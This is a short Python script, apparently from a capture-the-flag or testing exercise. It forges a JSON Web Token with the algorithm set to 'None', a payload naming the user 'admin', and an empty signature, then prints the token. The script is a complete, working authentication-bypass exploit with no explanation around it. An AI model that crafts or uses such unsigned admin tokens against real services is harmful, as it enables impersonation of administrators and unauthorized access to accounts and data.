import base64
def jwtBase64Encode(x):
    # Test some changes
    return base64.b64encode(x.encode('utf-8')).decode().replace('+', '-').replace('/', '_').replace('=', '')
header = '{"alg": "None","typ": "JWT"}'
payload = '{"id":"1","username":"admin"} '

print(jwtBase64Encode(header)+'.'+jwtBase64Encode(payload)+'.')
